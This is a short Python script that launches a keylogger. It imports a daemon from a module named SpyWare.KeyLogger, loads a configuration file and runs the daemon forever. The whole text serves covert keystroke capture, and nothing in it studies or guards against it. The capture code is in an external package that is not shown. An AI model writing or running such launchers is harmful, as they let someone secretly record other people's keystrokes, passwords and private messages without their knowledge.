from SpyWare.KeyLogger import Daemon, keyConfig

keyConfig("my.conf")

Daemon().run_for_ever()
